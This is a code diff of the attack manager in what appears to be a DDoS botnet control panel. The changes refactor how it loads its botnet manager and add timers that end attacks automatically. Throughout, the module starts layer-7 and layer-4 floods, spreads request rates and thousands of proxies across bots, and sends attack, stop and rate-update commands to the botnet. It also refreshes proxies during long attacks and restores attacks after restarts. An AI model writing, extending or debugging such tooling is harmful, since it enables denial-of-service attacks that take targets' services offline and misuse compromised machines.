@@ -12,31 +12,28 @@ from app.core.models import AttackStatus, AttackRequest, AttackResult
 from app.managers.concurrent_manager import concurrent_manager
 from app.managers.history_manager import history_manager
 from app.managers.proxy_manager import proxy_manager
-from app.managers.botnet_manager import botnet_manager
 
 from app.engine.layer7 import run_layer7_attack
 from app.engine.layer4 import run_layer4_attack
 
 
 class AttackManager:
-    """
-    Manajer serangan utama dengan per-bot RPS distribution + PROXY AUTO-ATTACH.
-    Fully synchronized dengan botnet_manager dan proxy_manager.
-    """
-
     def __init__(self):
         self.active_attacks: Dict[str, AttackStatus] = {}
         self.attack_tasks: Dict[str, asyncio.Task] = {}
         self._stop_event = asyncio.Event()
         self._lock = asyncio.Lock()
+        self._botnet_manager = None  # Lazy loaded
 
-    # ===================== PUBLIC API =====================
+    @property
+    def botnet_manager(self):
+        """Lazy load botnet_manager to avoid circular import."""
+        if self._botnet_manager is None:
+            from app.managers.botnet_manager import botnet_manager
+            self._botnet_manager = botnet_manager
+        return self._botnet_manager
 
     async def start_attack(self, req: AttackRequest) -> str:
-        """
-        Start serangan baru dengan PROXY AUTO-ATTACH ke bot.
-        """
-        # Cek concurrent
         async with self._lock:
             current_active = len(self.active_attacks)
             max_conc = await concurrent_manager.get_max()
@@ -63,10 +60,8 @@ class AttackManager:
 
         await self._save_attack_to_redis(attack)
 
-        # BACA RPS LIMIT
         rps_limit = await self._get_rps_limit()
 
-        # GET PROXIES DARI POOL
         proxies = await proxy_manager.get_mixed_proxies(count=2000)
         if not proxies:
             logger.warning("[ATTACK] No proxies in pool! Running emergency refresh...")
@@ -76,8 +71,7 @@ class AttackManager:
         proxy_count = len(proxies)
         logger.info(f"[ATTACK] Fetched {proxy_count} proxies from pool")
 
-        # GET BOT COUNT
-        bot_ids = await botnet_manager.get_active_bot_ids()
+        bot_ids = await self.botnet_manager.get_active_bot_ids()
         bot_count = len(bot_ids)
 
         if bot_count == 0:
@@ -90,7 +84,6 @@ class AttackManager:
                 rps_per_bot = 0
             logger.info(f"📊 Distribution: {rps_limit} RPS / {bot_count} bots = {rps_per_bot} RPS/bot | {proxy_count} proxies")
 
-        # Gunakan botnet_manager.broadcast_attack_with_proxies() untuk distribute proxy ke semua bot
         if bot_count > 0 and proxies:
             attack_data = {
                 "attack_id": attack_id,
@@ -103,13 +96,12 @@ class AttackManager:
                 "extra": "",
             }
 
-            result = await botnet_manager.broadcast_attack_with_proxies(attack_data, proxies)
+            result = await self.botnet_manager.broadcast_attack_with_proxies(attack_data, proxies)
             logger.info(f"📡 Botnet broadcast result: {result}")
         elif bot_count > 0:
-            # No proxies — send attack without
             for bot_id in bot_ids:
                 asyncio.create_task(
-                    botnet_manager.send_to_bot(bot_id, {
+                    self.botnet_manager.send_to_bot(bot_id, {
                         "cmd": "attack",
                         "attack_id": attack_id,
                         "method": req.method,
@@ -123,11 +115,12 @@ class AttackManager:
                 )
             logger.warning(f"📡 Sent attack to {bot_count} bots WITHOUT proxies!")
 
-        # Jalankan direct attack dari server
         task = asyncio.create_task(self._run_direct_attack(attack_id, rps_limit, proxies))
         self.attack_tasks[attack_id] = task
 
-        # Start mid-attack proxy refresh kalo attack > 5 menit
+        total_duration = req.duration + (req.hold_time or 0)
+        asyncio.create_task(self._auto_finalize(attack_id, total_duration))
+
         if req.duration > 300:
             asyncio.create_task(self._mid_attack_proxy_refresh(attack_id, req.duration))
 
@@ -146,9 +139,15 @@ class AttackManager:
 
         return attack_id
 
-    # Mid-attack proxy refresh (12H stability)
+    async def _auto_finalize(self, attack_id: str, total_duration: int):
+        logger.info(f"[AUTO] Attack {attack_id} will auto-finalize in {total_duration}s")
+        await asyncio.sleep(total_duration + 5)
+
+        if attack_id in self.active_attacks:
+            logger.info(f"[AUTO] Auto-finalizing attack {attack_id} after {total_duration}s")
+            await self._finalize_attack(attack_id)
+
     async def _mid_attack_proxy_refresh(self, attack_id: str, duration: int):
-        """Auto-refresh proxy tiap 3 menit selama attack berjalan."""
         refresh_interval = 180
         max_refreshes = max(0, (duration // refresh_interval) - 1)
 
@@ -167,7 +166,7 @@ class AttackManager:
                     logger.warning(f"[REFRESH] No fresh proxies for {attack_id}")
                     continue
 
-                result = await botnet_manager.broadcast_proxy_refresh(attack_id, fresh_proxies)
+                result = await self.botnet_manager.broadcast_proxy_refresh(attack_id, fresh_proxies)
                 logger.info(f"[REFRESH] Attack {attack_id} refreshed #{i+1}: {result}")
 
             except Exception as e:
@@ -176,21 +175,23 @@ class AttackManager:
         logger.info(f"[REFRESH] Completed for {attack_id}")
 
     async def stop_attack(self, attack_id: str) -> bool:
-        """Stop attack yang sedang berjalan (manual)."""
         async with self._lock:
             if attack_id not in self.active_attacks:
                 return False
 
             if attack_id in self.attack_tasks:
                 self.attack_tasks[attack_id].cancel()
+                try:
+                    await self.attack_tasks[attack_id]
+                except asyncio.CancelledError:
+                    pass
                 del self.attack_tasks[attack_id]
 
             attack = self.active_attacks.pop(attack_id, None)
 
         await self._remove_attack_from_redis(attack_id)
 
-        # FIXED: Broadcast stop dengan proper command format
-        await botnet_manager.broadcast_command({
+        await self.botnet_manager.broadcast_command({
             "cmd": "stop",
             "attack_id": attack_id
         })
@@ -212,7 +213,6 @@ class AttackManager:
         return True
 
     async def stop_all_attacks(self) -> int:
-        """Stop semua attack yang sedang berjalan."""
         attack_ids = list(self.active_attacks.keys())
         count = 0
         for aid in attack_ids:
@@ -252,6 +252,10 @@ class AttackManager:
                 self.active_attacks[aid] = attack
                 task = asyncio.create_task(self._run_direct_attack(aid, 0, []))
                 self.attack_tasks[aid] = task
+                total_duration = attack.duration + (attack.hold_time or 0)
+                elapsed = attack.elapsed
+                remaining = max(0, total_duration - elapsed)
+                asyncio.create_task(self._auto_finalize(aid, remaining))
                 restored += 1
                 log_attack_event(aid, "restored", {
                     "method": attack.method,
@@ -265,12 +269,11 @@ class AttackManager:
         logger.info(f"Restored {restored} active attacks from Redis.")
 
     async def update_attack_rps(self, attack_id: str, new_rps: int) -> bool:
-        """Update RPS limit untuk attack yang sedang berjalan."""
         if attack_id not in self.active_attacks:
             logger.warning(f"Attack {attack_id} not found, cannot update RPS")
             return False
 
-        bot_ids = await botnet_manager.get_active_bot_ids()
+        bot_ids = await self.botnet_manager.get_active_bot_ids()
         bot_count = len(bot_ids)
 
         if bot_count == 0:
@@ -282,7 +285,7 @@ class AttackManager:
 
         for bot_id in bot_ids:
             asyncio.create_task(
-                botnet_manager.send_to_bot(bot_id, {
+                self.botnet_manager.send_to_bot(bot_id, {
                     "cmd": "update_rps",
                     "attack_id": attack_id,
                     "rps_limit": rps_per_bot,
@@ -297,8 +300,6 @@ class AttackManager:
 
         return True
 
-    # ===================== INTERNAL METHODS =====================
-
     async def _get_rps_limit(self) -> int:
         redis = await get_redis()
         value = await redis.get("scythe:config:attack_rps_limit")
@@ -307,7 +308,6 @@ class AttackManager:
         return int(value)
 
     async def _run_direct_attack(self, attack_id: str, rps_limit: int = 0, proxies: List[str] = None):
-        """Jalankan serangan langsung dari server (menggunakan engine)."""
         attack = self.active_attacks.get(attack_id)
         if not attack:
             return
@@ -380,8 +380,6 @@ class AttackManager:
                 "avg_rps": avg_rps,
                 "duration": attack.duration
             })
-
-    # ===================== REDIS HELPERS =====================
 
     async def _save_attack_to_redis(self, attack: AttackStatus):
         r = await get_redis()
